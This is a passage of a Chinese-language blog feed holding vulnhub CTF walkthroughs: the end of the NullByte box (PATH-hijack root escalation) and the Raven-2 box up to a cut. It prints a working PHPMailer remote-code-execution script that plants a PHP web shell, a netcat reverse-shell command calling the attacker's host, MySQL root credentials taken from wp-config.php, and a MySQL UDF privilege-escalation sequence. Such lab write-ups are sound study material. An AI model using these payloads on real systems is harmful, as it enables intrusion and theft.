<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">proof.txt</span><br><span class="line"><span class="comment"># cat proof.txt </span></span><br><span class="line">adf11c7a9e6523e630aaf3b9b7acb51d</span><br><span class="line"></span><br><span class="line">It seems that you have pwned the box, congrats. </span><br><span class="line">Now you <span class="keyword">done</span> that I wanna talk with you. Write a walk &amp; mail at</span><br><span class="line">xly0n@sigaint.org attach the walk and proof.txt</span><br><span class="line">If sigaint.org is down you may mail at nbsly0n@gmail.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">USE THIS PGP PUBLIC KEY</span><br><span class="line"></span><br><span class="line">-----BEGIN PGP PUBLIC KEY BLOCK-----</span><br><span class="line">Version: BCPG C<span class="comment"># v1.6.1.0</span></span><br><span class="line"></span><br><span class="line">mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ</span><br><span class="line">Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT</span><br><span class="line">e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq</span><br><span class="line">Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK</span><br><span class="line">+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe</span><br><span class="line">YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu</span><br><span class="line">Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS</span><br><span class="line">HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q</span><br><span class="line">m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn</span><br><span class="line">XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58</span><br><span class="line">kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8</span><br><span class="line">TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU</span><br><span class="line">Gms=</span><br><span class="line">=PiAQ</span><br><span class="line">-----END PGP PUBLIC KEY BLOCK-----</span><br></pre></td></tr></table></figure>

<p>将adf11c7a9e6523e630aaf3b9b7acb51d解密，结果是welldone22</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub125.jpg"></p>
<h3 id="提权2"><a href="#提权2" class="headerlink" title="提权2"></a>提权2</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ramses@NullByte:/var/www/backup$ cp /bin/sh /tmp/ps</span><br><span class="line">ramses@NullByte:/var/www/backup$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">.:/usr/<span class="built_in">local</span>/bin:/usr/bin:/bin:/usr/<span class="built_in">local</span>/games:/usr/games</span><br><span class="line">ramses@NullByte:/var/www/backup$ <span class="built_in">export</span> PATH=/tmp:/usr/<span class="built_in">local</span>/bin:/usr/bin:/bin:/usr/<span class="built_in">local</span>/games:/usr/games</span><br><span class="line">ramses@NullByte:/var/www/backup$ ./procwatch</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<h3 id="提权3"><a href="#提权3" class="headerlink" title="提权3"></a>提权3</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ramses@NullByte:/tmp$ nano ps</span><br><span class="line">ramses@NullByte:/tmp$ chmod 777 ps</span><br><span class="line">ramses@NullByte:/tmp$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/tmp:/usr/<span class="built_in">local</span>/bin:/usr/bin:/bin:/usr/<span class="built_in">local</span>/games:/usr/games</span><br><span class="line">ramses@NullByte:/tmp$ <span class="built_in">export</span> PATH=.:<span class="variable">$PATH</span></span><br><span class="line">ramses@NullByte:/tmp$ <span class="built_in">cd</span> /var/www/backup</span><br><span class="line">ramses@NullByte:/var/www/backup$ ./procwatch</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[Raven-2]</title>
    <url>/2020/03/26/Raven-2/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：Raven：2<br>发布日期：2018年11月9日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL29wZW4/aWQ9MWZYcDRKUzhBTk9lQ2xuSzYzTHdnS1hsNTZCcUZKMjN6">https://drive.google.com/open?id=1fXp4JS8ANOeClnK63LwgKXl56BqFJ23z<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9yYXZlbi9SYXZlbjIub3Zh">https://download.vulnhub.com/raven/Raven2.ova<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9yYXZlbi9SYXZlbjIub3ZhLnRvcnJlbnQ=">https://download.vulnhub.com/raven/Raven2.ova.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>Raven 2是中等级别的boot2root VM。有四个要获取的flag。多次攻击破坏之后，Raven Security采取了额外的措施来加固Web服务器，以防止黑客入侵。您是否仍然可以crush Raven？</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.*</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.119</span><br><span class="line">Host is up (0.00022s latency).</span><br><span class="line">MAC Address: 08:00:27:A4:D6:91 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -v -p- 192.168.56.119</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">58132/tcp open  status  1 (RPC <span class="comment">#100024)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -v -p 22,80,111,58132 192.168.56.119 --script=vuln -T4</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.119</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.119:80/</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&amp;id=92a4423d01</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.119:80/service.html</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&amp;id=92a4423d01</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.119:80/contact.php</span><br><span class="line">|     Form id: myform</span><br><span class="line">|     Form action: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.119:80/contact.php</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&amp;id=92a4423d01</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.119:80/index.html</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&amp;id=92a4423d01</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.119:80/wordpress/</span><br><span class="line">|     Form id: search-form-5e7c8d72d17d7</span><br><span class="line">|_    Form action: http://raven.local/wordpress/</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">| http-enum: </span></span><br><span class="line"><span class="string">|   /wordpress/: Blog</span></span><br><span class="line"><span class="string">|   /wordpress/wp-login.php: Wordpress login page.</span></span><br><span class="line"><span class="string">|   /css/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.10 (debian)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|   /img/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.10 (debian)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|   /js/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.10 (debian)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|   /manual/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|_  /vendor/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.10 (debian)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.4.10 (Debian)</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          35360/udp6  status</span><br><span class="line">|   100024  1          35599/tcp6  status</span><br><span class="line">|   100024  1          46931/udp   status</span><br><span class="line">|_  100024  1          58132/tcp   status</span><br><span class="line">58132/tcp open  status  1 (RPC <span class="comment">#100024)</span></span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br></pre></td></tr></table></figure>

<p>上nikto</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nikto -C all -h 192.168.56.119</span></span><br><span class="line">+ OSVDB-3268: /img/: Directory indexing found.</span><br><span class="line">+ OSVDB-3092: /img/: This might be interesting...</span><br><span class="line">+ OSVDB-3092: /manual/: Web server manual found.</span><br><span class="line">+ OSVDB-3268: /manual/images/: Directory indexing found.</span><br><span class="line">+ OSVDB-6694: /.DS_Store: Apache on Mac OSX will serve the .DS_Store file, <span class="built_in">which</span> contains sensitive information. Configure Apache to ignore this file or upgrade to a newer version.</span><br><span class="line">+ OSVDB-3233: /icons/README: Apache default file found.</span><br><span class="line">+ Uncommon header <span class="string">&#x27;link&#x27;</span> found, with contents: &lt;http://raven.local/wordpress/index.php/wp-json/&gt;; rel=<span class="string">&quot;https://api.w.org/&quot;</span></span><br><span class="line">+ /wordpress/: A Wordpress installation was found.</span><br></pre></td></tr></table></figure>

<p>网站使用wordpress搭建的，现在把raven.local添加到kali的/etc/hosts文件中和windows的hosts文件中。。。<br>用dirbuster扫描网站，使用medium字典，看看能得到什么。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub217.jpg"></li>
</ul>
<h3 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h3><p>/vendor目录下有一个PATH文件，里面是第一个flag</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub218.jpg"></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag1&#123;a2c1f66d2b8051bd3a5874b5b6e43e21&#125;</span><br></pre></td></tr></table></figure>

<h3 id="PHPMailer-lt-5-2-18-远程命令执行"><a href="#PHPMailer-lt-5-2-18-远程命令执行" class="headerlink" title="PHPMailer&lt;5.2.18-远程命令执行"></a>PHPMailer&lt;5.2.18-远程命令执行</h3><p>看起来该站点还使用PHPMailer 5.2.16。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub219.jpg"></li>
</ul>
<p>5.2.18之前的PHPMailer版本易于执行远程命令</p>
<p>为此编写一个bash脚本，使用curl作为漏洞利用的主要驱动程序。</p>
<p>exploit.sh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">TARGET=http://raven.local/contact.php</span><br><span class="line"></span><br><span class="line">DOCROOT=/var/www/html</span><br><span class="line">FILENAME=backdoor.php</span><br><span class="line">LOCATION=<span class="variable">$DOCROOT</span>/<span class="variable">$FILENAME</span></span><br><span class="line"></span><br><span class="line">STATUS=$(curl -s \</span><br><span class="line">              --data-urlencode <span class="string">&quot;name=Hackerman&quot;</span> \</span><br><span class="line">              --data-urlencode <span class="string">&quot;email=\&quot;hackerman\\\&quot; -oQ/tmp -X<span class="variable">$LOCATION</span> blah\&quot;@badguy.com&quot;</span> \</span><br><span class="line">              --data-urlencode <span class="string">&quot;message=&lt;?php echo shell_exec(\$_GET[&#x27;cmd&#x27;]); ?&gt;&quot;</span> \</span><br><span class="line">              --data-urlencode <span class="string">&quot;action=submit&quot;</span> \</span><br><span class="line">              <span class="variable">$TARGET</span> | sed -r <span class="string">&#x27;146!d&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> grep <span class="string">&#x27;instantiate&#x27;</span> &amp;&gt;/dev/null &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$STATUS</span>&quot;</span>; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;[+] Check <span class="variable">$&#123;LOCATION&#125;</span>?cmd=[shell command, e.g. id]&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;[!] Exploit failed&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>执行脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/raven2<span class="comment"># ./exploit.sh </span></span><br><span class="line">[+] Check /var/www/html/backdoor.php?cmd=[shell <span class="built_in">command</span>, e.g. id]</span><br></pre></td></tr></table></figure>

<p>之后成功运行命令如下图所示</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">view-source:http://raven.local/backdoor.php?cmd=whoami</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub220.jpg"></li>
</ul>
<h3 id="低权限的shell"><a href="#低权限的shell" class="headerlink" title="低权限的shell"></a>低权限的shell</h3><p>使用nc的-e选项反弹一个低权限的shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">view-source:http://raven.local/backdoor.php?cmd=nc%20192.168.56.102%205566%20<span class="_">-e</span>%20/bin/bash</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">connect to [192.168.56.102] from raven.local [192.168.56.119] 44985</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@Raven:/var/www/html$ id                                              </span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@Raven:/var/www/html$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>

<p>现在获取了一个低权限的shell</p>
<h3 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag 2"></a>Flag 2</h3><p>第二个flag位于www-data的home目录中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ww-data@Raven:/var/www$ ls</span><br><span class="line">ls</span><br><span class="line">flag2.txt  html</span><br><span class="line">www-data@Raven:/var/www$ cat flag2.txt</span><br><span class="line">cat flag2.txt</span><br><span class="line">flag2&#123;6a8ed560f0b5358ecf844108048eb337&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Flag-3"><a href="#Flag-3" class="headerlink" title="Flag 3"></a>Flag 3</h3><p>使用find命令寻找flag3</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Raven:/var/www$ find / -<span class="built_in">type</span> f -name <span class="string">&#x27;flag[3-4].*&#x27;</span> 2&gt;/dev/null</span><br><span class="line">find / -<span class="built_in">type</span> f -name <span class="string">&#x27;flag[3-4].*&#x27;</span> 2&gt;/dev/null</span><br><span class="line">/var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png</span><br></pre></td></tr></table></figure>

<p>浏览器访问</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://raven.local/wordpress/wp-content/uploads/2018/11/flag3.png</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub221.jpg"></li>
</ul>
<p>到此得到第3个flag</p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>在对www-data的帐户进行枚举时，注意到MySQL以root身份运行。但是由于此版本的MySQL是5.5，所以不能使用流行的EDB-ID 1518用户定义函数或UDF。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root       921  0.0 10.1 552000 51240 ?        Sl   01:02   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --<span class="built_in">log</span>-error=/var/<span class="built_in">log</span>/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Raven:/var/www$ dpkg -l | grep mysql</span><br><span class="line">dpkg -l | grep mysql</span><br><span class="line">ii  libdbd-mysql-perl              4.028-2+deb8u2                     amd64        Perl5 database interface to the MySQL database</span><br><span class="line">ii  libmysqlclient18:amd64         5.5.60-0+deb8u1                    amd64        MySQL database client library</span><br><span class="line">ii  mysql-client-5.5               5.5.60-0+deb8u1                    amd64        MySQL database client binaries</span><br><span class="line">ii  mysql-common                   5.5.60-0+deb8u1                    all          MySQL database common files, e.g. /etc/mysql/my.cnf</span><br><span class="line">ii  mysql-server                   5.5.60-0+deb8u1                    all          MySQL database server (metapackage depending on the latest version)</span><br><span class="line">ii  mysql-server-5.5               5.5.60-0+deb8u1                    amd64        MySQL database server binaries and system database setup</span><br><span class="line">ii  mysql-server-core-5.5          5.5.60-0+deb8u1                    amd64        MySQL database server binaries</span><br><span class="line">ii  php5-mysqlnd                   5.6.36+dfsg-0+deb8u1               amd64        MySQL module <span class="keyword">for</span> php5 (Native Driver)</span><br><span class="line">ii  php5-mysqlnd-ms                1.6.0-1+b1                         amd64        MySQL replication and load balancing module <span class="keyword">for</span> PHP</span><br></pre></td></tr></table></figure>

<p>从wp-config.php文件中得到mysql的账号密码登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Raven:/var/www/html$ grep -A3 -B3 root wordpress/wp-config.php</span><br><span class="line">grep -A3 -B3 root wordpress/wp-config.php</span><br><span class="line">define(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line"></span><br><span class="line">/** MySQL database username */</span><br><span class="line">define(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line">define(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;R@v3nSecurity&#x27;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>【提权方法1】：</li>
</ul>
<p>有一个GitHub仓库<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL215c3FsdWRm">UDF-Repository-for-MySQL<i class="fa fa-external-link-alt"></i></span>，其中托管着许多5.5兼容的UDF，可以使用它们来完成提权。选择<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL215c3FsdWRmL2xpYl9teXNxbHVkZl9zeXM=">lib_mysqludf_sys<i class="fa fa-external-link-alt"></i></span>，这是一个具有与操作系统交互功能的UDF库。</p>
<ul>
<li>【提权方法2】：</li>
</ul>
<p>MySQL利用远程root代码执行提权</p>
<p>更多信息参考<span class="exturl" data-url="aHR0cHM6Ly9sZWdhbGhhY2tlcnMuY29tL2Fkdmlzb3JpZXMvTXlTUUwtRXhwbG9pdC1SZW1vdGUtUm9vdC1Db2RlLUV4ZWN1dGlvbi1Qcml2ZXNjLUNWRS0yMDE2LTY2NjIuaHRtbA==">MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662<i class="fa fa-external-link-alt"></i></span></p>
<p>因此，搜索UDF动态库漏洞利用程序，并在漏洞利用数据库中将其命名为“1518.c”。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMTUxOA==">exploit-1518<i class="fa fa-external-link-alt"></i></span></p>
<p>该漏洞利用是通过将原始C代码编译为“.so”文件，然后将其传输到受害计算机并利用MySQL漏洞来运行的。<br>第一步是对其进行编译。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/raven2/priviligesc<span class="comment"># searchsploit 1518</span></span><br><span class="line">MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)           | exploits/linux/<span class="built_in">local</span>/1518.c</span><br><span class="line">root@kali:~/vulnhub/raven2/priviligesc<span class="comment"># locate 1518.c</span></span><br><span class="line">/root/vulnhub/raven1/1518.c</span><br><span class="line">/usr/share/exploitdb/exploits/linux/<span class="built_in">local</span>/1518.c</span><br><span class="line">root@kali:~/vulnhub/raven2/priviligesc<span class="comment"># cp /usr/share/exploitdb/exploits/linux/local/1518.c .</span></span><br><span class="line">root@kali:~/vulnhub/raven2/priviligesc<span class="comment"># ls</span></span><br><span class="line">1518.c</span><br><span class="line">root@kali:~/vulnhub/raven2/priviligesc<span class="comment"># gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.c -lc</span></span><br><span class="line">root@kali:~/vulnhub/raven2/priviligesc<span class="comment"># ls</span></span><br><span class="line">1518.c  1518.so</span><br></pre></td></tr></table></figure>

<p>将该“.so”文件传输到受害者计算机的/tmp目录下。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/raven2/priviligesc<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">192.168.56.1 - - [26/Mar/2020 03:52:25] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.56.1 - - [26/Mar/2020 03:52:33] <span class="string">&quot;GET /1518.so HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.56.119 - - [26/Mar/2020 03:52:50] <span class="string">&quot;GET /1518.so HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Raven:/tmp$ wget http://192.168.56.102/1518.so</span><br><span class="line">wget http://192.168.56.102/1518.so</span><br><span class="line">converted <span class="string">&#x27;http://192.168.56.102/1518.so&#x27;</span> (ANSI_X3.4-1968) -&gt; <span class="string">&#x27;http://192.168.56.102/1518.so&#x27;</span> (UTF-8)</span><br><span class="line">--2020-03-27 02:52:49--  http://192.168.56.102/1518.so</span><br><span class="line">Connecting to 192.168.56.102:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 19104 (19K) [application/octet-stream]</span><br><span class="line">Saving to: <span class="string">&#x27;1518.so&#x27;</span></span><br><span class="line"></span><br><span class="line">1518.so             100%[=====================&gt;]  18.66K  --.-KB/s   <span class="keyword">in</span> 0s     </span><br><span class="line"></span><br><span class="line">2020-03-27 02:52:49 (554 MB/s) - <span class="string">&#x27;1518.so&#x27;</span> saved [19104/19104]</span><br><span class="line"></span><br><span class="line">www-data@Raven:/tmp$ chmod 777 *</span><br><span class="line">chmod 777 *</span><br></pre></td></tr></table></figure>

<ul>
<li>使用命令行登录mysql，利用漏洞和mysql命令行及so文件进行提权,如下所示</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Raven:/tmp$ mysql -uroot -p<span class="string">&#x27;R@v3nSecurity&#x27;</span></span><br><span class="line">mysql -uroot -p<span class="string">&#x27;R@v3nSecurity&#x27;</span></span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 37</span><br><span class="line">Server version: 5.5.60-0+deb8u1 (Debian)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">use mysql;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; create table foo(line blob);</span><br><span class="line">insert into foo values(load_file(<span class="string">&#x27;/tmp/1518.so&#x27;</span>));</span><br><span class="line">select * from foo into dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/1518.so&#x27;</span>;</span><br><span class="line">create <span class="keyword">function</span> do_system returns <span class="built_in">integer</span> soname <span class="string">&#x27;1518.so&#x27;</span>;</span><br><span class="line">select do_system(<span class="string">&#x27;chmod u+s /usr/bin/find&#x27;</span>);create table foo(line blob);</span><br><span class="line">insert into foo values(load_file(<span class="string">&#x27;/tmp/1518.so&#x27;</span>));</span><br><span class="line">select * from foo into dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/1518.so&#x27;</span>;</span><br><span class="line">create <span class="keyword">function</span> do_system returns <span class="built_in">integer</span> soname <span class="string">&#x27;1518.so&#x27;</span>;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into foo values(load_file(<span class="string">&#x27;/tmp/1518.so&#x27;</span>));</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from foo into dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/1518.so&#x27;</span>;</span><br><span class="line">Query OK, 1 row affected (0.10 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; create <span class="keyword">function</span> do_system returns <span class="built_in">integer</span> soname <span class="string">&#x27;1518.so&#x27;</span>;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select do_system(<span class="string">&#x27;chmod u+s /usr/bin/find&#x27;</span>);</span><br><span class="line">&lt;mod u+s /usr/bin/find<span class="string">&#x27;);select do_system(&#x27;</span>chmod u+s /usr/bin/find<span class="string">&#x27;);        </span></span><br><span class="line"><span class="string">+--------------------------------------+</span></span><br><span class="line"><span class="string">| do_system(&#x27;</span>chmod u+s 